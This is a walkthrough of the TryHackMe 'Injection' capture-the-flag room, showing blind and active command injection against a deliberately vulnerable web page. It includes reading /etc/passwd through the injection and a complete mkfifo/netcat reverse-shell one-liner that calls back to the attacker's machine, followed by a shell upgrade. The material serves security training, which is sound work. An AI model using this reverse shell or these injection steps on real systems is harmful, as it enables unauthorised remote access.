---
title: "Walk-through of Injection from TryHackMe"
header:
  teaser: /assets/images/2020-06-03-14-47-11.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - injection
  - blind
  - Linux
---

## Machine Information

![injection](/assets/images/2020-06-03-14-47-11.png)

Injection is a beginner level room designed to show the dangers of badly coded web pages. Skills required are basic Linux knowledge and an understanding of the layout of its filesystem. Skills learned are exploiting vulnerable webpages to achieve command injection.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Tomghost](https://tryhackme.com/room/injection) |
| Machine Release Date | 2nd June 2020 |
| Date I Completed It | 2nd June 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/releases/kali-linux-2020-1-release/) |

## Tasks 1 and 2

Task 1 and 2 are introductions and don't require any questions to be answered.

## Task 3 - Blind Injection

### Question 3.1

Ping the box with 10 packets.  What is this command (without IP address)?

A quick look at the help for ping will give you a clue to this answer:

```text
root@kali:~# ping -h
Usage
  ping [options] <destination>

Options:
  <destination>      dns name or ip address
  -a                 use audible ping
  -A                 use adaptive ping
  -B                 sticky source address
  -c <count>         stop after <count> replies
  -D                 print timestamps
  -d                 use SO_DEBUG socket option
  -f                 flood ping
  -h                 print help and exit
  -I <interface>     either interface name or address
  -i <interval>      seconds between sending each packet
  -L                 suppress loopback of multicast packets
  -l <preload>       send <preload> number of packages while waiting replies
  -m <mark>          tag the packets going out
  -M <pmtud opt>     define mtu discovery, can be one of <do|dont|want>
  -n                 no dns name resolution
  -O                 report outstanding replies
  -p <pattern>       contents of padding byte
  -q                 quiet output
  -Q <tclass>        use quality of service <tclass> bits
  -s <size>          use <size> as number of data bytes to be sent
  -S <size>          use <size> as SO_SNDBUF socket option value
  -t <ttl>           define time to live
  -U                 print user-to-user latency
  -v                 verbose output
  -V                 print version and exit
  -w <deadline>      reply wait <deadline> in seconds
  -W <timeout>       time to wait for response
```

### Question 3.2

Try to redirect output to a file on the web server.  What alert message do you see appear?

The explanation for this task talks about the standard Bash operator for redirection, which is >. We need to try redirecting the output of the vulnerable web page to see what we get:

![redirect](/assets/images/2020-06-02-22-52-46.png)

### Question 3.3

Enter "root" into the input and review the alert.  What type of alert do you get?

Simple enough, let's do as instructed, what message do we get back:

![root](/assets/images/2020-06-02-22-54-43.png)

### Question 3.4

Enter "www-data" into the input and review the alert.  What type of alert do you get?

![www-data](/assets/images/2020-06-02-22-55-50.png)

### Question 3.5

Enter your name into the input and review the alert.  What type of alert do you get?

![pencer](/assets/images/2020-06-02-22-56-37.png)

## Task 4 - Active Injection

### Question 4.1

What strange text file is in the website root directory?

Let's check where we are with pwd (present working directory):

![pwd](/assets/images/2020-06-02-23-06-05.png)

We can use ls to list the current directory, but need to try and make sense of the output:

![ls](/assets/images/2020-06-02-23-07-12.png)

### Question 4.2

How many non-root/non-service/non-daemon users are there?

We look in the passwd file to see the users on the system:

![passwd](/assets/images/2020-06-02-23-09-28.png)

We need to make sense of that output and work out the number.

### Question 4.3

What user is this app running as?

Let's check who we are:

![whoami](/assets/images/2020-06-02-23-11-57.png)

### Question 4.4

What is the user's shell set as?

We can go back to the output of the passwd file to see what our shell is set to. We can also use the getent command to make it easier:

![getent](/assets/images/2020-06-02-23-16-10.png)

### Question 4.5

What version of Ubuntu is running?

There's a helpful command called lsb_release you can use here:

![lsb_release](/assets/images/2020-06-03-13-52-16.png)

### Question 4.6

Print out the MOTD.  What favorite beverage is shown?

The way MOTD works has changed over the years, and it's different depending on the distribution. There's a hint for it in the question that will help. Also [here](https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server) is a good explanation for the version of Ubuntu we are dealing with. Here's is how you could do it:

![motd](/assets/images/2020-06-03-13-57-51.png)

## Task 5 - Get The Flag

Time to find the hidden flag. You can do this using the website, but with command injection available it's more fun to get a shell on to the box. Start nc on your attack machine:

```text
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
```

Then enter this command on the vulnerable website, changing IP and port as needed:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.17.195 1234 >/tmp/f
```

![nc](/assets/images/2020-06-02-22-59-08.png)

Back on Kali we see the connection, and have our reverse shell open:

```text
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.9.17.195] from (UNKNOWN) [10.10.197.105] 35026
/bin/sh: 0: can't access tty; job control turned off
```

First thing is get a proper interactive shell running:

```text
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@injection:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@kali:~# stty raw -echo
```

Now we need to think how we will find the hidden flag. I started by looking around the obvious areas, like web site root, user home, but found nothing. So resorted to a guess on what extension the file might have and used **find** to look for it:

```text
www-data@injection:/$ find / -name *.txt 2>/dev/null | more
```

It's a longish list, but look through that a certain file will jump out at you.

All done. See you next time.
